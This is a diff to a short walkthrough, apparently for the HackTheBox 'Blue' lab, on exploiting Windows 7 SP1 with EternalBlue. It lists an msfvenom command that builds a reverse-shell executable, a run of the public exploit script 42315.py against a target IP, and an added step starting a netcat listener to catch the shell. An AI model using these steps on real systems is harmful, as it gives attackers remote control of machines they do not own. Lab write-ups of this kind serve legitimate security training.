@@ -18,6 +18,7 @@ service_exec(conn, r'cmd /c c:\eternal-blue.exe')
 Command:- msfvenom -p windows/shell_reverse_tcp -f exe LHOST=YOUR_IP LPORT=THE_PORT_U_WANT_TO_LISTEN_ON > eternal-blue.exe
 5)Run the 42315.py 
 Command:-python 42315.py <IP_OF_YOUR_TARGET>
+6) Start a listener on your machine:- nc -nvlp <THE_PORT_U_R_LISTENING_ON>
 If you get an error with impacket install , install impacket using command:-pip install impacket.
 So, now i have showed how to exploit Windows 7 Professional 7601 Service Pack 1 using Eternal Blue  (I tried this on Blue Box on hackthebox).
 
